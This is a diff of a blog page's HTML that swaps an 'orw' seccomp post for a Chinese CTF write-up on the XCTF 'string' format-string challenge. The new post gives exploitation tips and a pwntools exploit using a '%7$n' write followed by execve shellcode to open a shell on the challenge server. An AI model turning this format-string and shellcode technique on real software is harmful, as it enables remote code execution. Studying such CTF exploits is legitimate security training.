@@ -16,24 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="沙箱保护机制">
+    <meta name="description" content="xctf-pwn string">
 <meta property="og:type" content="article">
-<meta property="og:title" content="orw">
-<meta property="og:url" content="https://isolator-1.github.io/2023/10/18/ctf-pwn/orw/index.html">
+<meta property="og:title" content="FormatString">
+<meta property="og:url" content="https://isolator-1.github.io/2023/10/23/ctf-pwn/FormatString/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="沙箱保护机制">
+<meta property="og:description" content="xctf-pwn string">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/orw/1.jpg">
-<meta property="article:published_time" content="2023-10-18T10:11:00.000Z">
-<meta property="article:modified_time" content="2023-10-18T11:20:56.191Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/FormatString/1.png">
+<meta property="article:published_time" content="2023-10-23T05:48:00.000Z">
+<meta property="article:modified_time" content="2023-10-23T06:03:28.911Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/orw/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/FormatString/1.png">
   
   
   
-  <title>orw - Isolator&#39;s Blog</title>
+  <title>FormatString - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="orw"></span>
+            <span id="subtitle" data-typed-text="FormatString"></span>
           
         </div>
 
@@ -209,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-18 18:11" pubdate>
-          October 18, 2023 pm
+        <time datetime="2023-10-23 13:48" pubdate>
+          October 23, 2023 pm
         </time>
       </span>
     
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          136 words
+          1.6k words
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          2 mins
+          14 mins
         
       </span>
     
@@ -270,16 +270,26 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">orw</h1>
+            <h1 style="display: none">FormatString</h1>
             
             
               <div class="markdown-body">
                 
-                <h5 id="安装seccomp"><a href="#安装seccomp" class="headerlink" title="安装seccomp"></a>安装seccomp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install gcc ruby-dev<br>gem install seccomp-tools<br></code></pre></td></tr></table></figure>
+                <p><img src="/img/FormatString/1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p>简单的格式化字符串</p>
+<p>这道题目需要注意的点包括</p>
+<ol>
+<li><p>题目中用%x打印出来的地址，可以直接用<code>int(...,16)</code>来接收，不要用ljust那一套。。。（-_-||</p>
+</li>
+<li><p>在利用格式化字符串漏洞的时候，如果用<code>p64(addr)  + %n(或者%p)...</code>时，要先保证addr没有<code>\0</code></p>
+<p>就像这道题，我一开始就非得不用它那个%ld输入要写入的地址，就非要把x[0]的地址和后面那一串一起写进去，后果就是print(format)时候根本不会打印aaaa…..和%n，因为地址里有\0，直接停止了😭还在那看了好半天是不是地址的格式问题</p>
+</li>
+<li><p><code>shellcraft.sh</code>用之前**一定要先指定平台 **<code> context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)</code></p>
+</li>
+</ol>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">58702</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x400d36&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>x0 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;What should your character&#x27;s name be:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;123&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;And, you wish is:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">85</span> + <span class="hljs-string">b&quot;%7$n&quot;</span><br><span class="hljs-comment">#payload = b&#x27;aaaaaaaa&#x27; + b&quot;%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br><br><span class="hljs-comment">#shellcode = &#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/orw/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>evecve被禁用了，system同样不行（因为也是调用的execve）</p>
-<h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_orw">https://buuoj.cn/challenges#pwnable_orw</a></p>
 
                 
               </div>
@@ -325,8 +335,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>orw</div>
-      <div>https://isolator-1.github.io/2023/10/18/ctf-pwn/orw/</div>
+      <div>FormatString</div>
+      <div>https://isolator-1.github.io/2023/10/23/ctf-pwn/FormatString/</div>
     </div>
     <div class="license-meta">
       
@@ -338,7 +348,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>October 18, 2023</div>
+          <div>October 23, 2023</div>
         </div>
       
       
@@ -370,18 +380,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/23/ctf-pwn/FormatString/" title="FormatString">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">FormatString</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/10/11/ctf-pwn/stack_migration/" title="Stack Migration">
-                        <span class="hidden-mobile">Stack Migration</span>
+                      <a href="/2023/10/18/ctf-pwn/orw/" title="orw">
+                        <span class="hidden-mobile">orw</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
